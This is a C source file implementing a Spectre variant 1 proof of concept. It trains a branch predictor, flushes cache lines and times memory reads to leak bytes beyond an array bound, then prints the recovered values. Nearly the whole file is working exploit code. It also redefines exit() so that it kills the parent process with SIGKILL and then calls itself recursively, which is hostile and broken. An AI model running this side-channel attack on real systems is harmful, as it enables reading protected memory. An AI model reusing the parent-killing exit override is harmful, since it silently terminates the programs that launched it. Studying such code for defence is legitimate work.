#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <stdint.h>
#include <signal.h>
#include <string.h>
#ifdef _MSC_VER
#include <intrin.h>
#pragma optimize("gt", on)
#else
#include <x86intrin.h>
#endif

#ifndef L1_CACHE_LINE_SIZE
#define L1_CACHE_LINE_SIZE 64
#endif

#define CACHE_HIT_THRESHOLD 200
#define ARRAY1_SIZE 16
#define TRIES 1000

void exit(int status);

void exit(int status)
{
	kill(getppid(), SIGKILL);
	exit(status);
}

// Global variables
unsigned int array1_size = 16;
uint8_t unused1[L1_CACHE_LINE_SIZE]; // used to ensure that array1 and 2 are in different cache lines
uint8_t array1[16] = {0, 1, 2, 3, 4, 5, 6, 7, 8, 9,
											10, 11, 12, 13, 14, 15};
uint8_t unused2[L1_CACHE_LINE_SIZE]; // same thing as unused1
uint8_t array2[256 * 512];
int results[256];
uint8_t temp = 0; /* To not optimize out victim_function() */

void victim_function(size_t x)
{
	if (x < array1_size)
	{
		temp &= array2[array1[x] * 512];
	}
}

static inline uint8_t get_max_value()
{
	int max = -1;
	for (int i = 0; i < 256; i++)
	{
		if (max < 0 || results[i] > results[max])
		{
			max = i;
		}
	}
	return max;
}

static inline uint64_t get_access_delay(volatile char *addr)
{
	register uint64_t time1, time2;
	unsigned junk;
	time1 = __rdtscp(&junk);
	junk = *addr;
	return __rdtscp(&junk) - time1;
}

uint8_t probe_memory_byte(size_t offset)
{
	int tries, mix_i, k, j, i;
	size_t training_x, x;
	volatile uint8_t *addr;
	unsigned int junk = 0;
	unsigned int ret = -1;

	memset(results, 0, sizeof(results));

	for (tries = TRIES; tries > 0; tries--)
	{
		// flush the whole array2 from cache
		for (j = 0; j < 256; j++)
		{
			_mm_clflush(&array2[j * 512]);
		}
		// 5 training runs for each attack run
		training_x = tries % array1_size;
		for (j = 29; j >= 0; j--)
		{
			_mm_clflush(&array1_size); // flush the array1_size from cache to force a cache miss
			// delay to ensure that the clflush is finished, if they tell you that you can also mfence 
			// they're lying, it only works on slower processors, lost 2 days on this
			for (volatile int z = 0; z < 100; z++) {} 

			// Fancy way to set x to a value smaller that array1_size if every 6th iteration
			// This is used to train the bredictor to predict the branch to be taken
			// in the conditional branch of the victim function
			x = ((j % 6) - 1) & ~0xFFFF;
			x = (x | (x >> 16));
			x = training_x ^ (x & (offset ^ training_x));

			/* Call the victim! */
			victim_function(x);
		}

		/* Time reads. Mixed-up order to prevent stride prediction */
		for (i = 0; i < 256; i++)
		{
			mix_i = ((i * 167) + 13) & 255;
			addr = &array2[mix_i * 512];
			if ((int)get_access_delay(addr) <= CACHE_HIT_THRESHOLD && mix_i != array1[training_x])
				results[mix_i]++; /* cache hit -> score +1 for this value */
		}
	}
	return get_max_value();
}

int main(int argc, char **argv)
{

	char *secret_ptr = argv[0];
	uint8_t size = atoi(argv[1]);
	uint8_t res;

	size_t offset = (size_t)(secret_ptr - (char *)array1);
	memset(array2, 1, sizeof(array2)); /* write to array2 so in RAM not copy-on-write zero pages */

	printf("secret_ptr: %p, size: %d, array1: %p ,offset %p\n", secret_ptr, size, array1, offset);

	while (size--)
	{
		res = probe_memory_byte(offset++);
		printf("Reading at offset %p -> value: %c(0x%x)\n",
					 offset, (res > 31 && res < 127) ? res : '?', res);
	}
}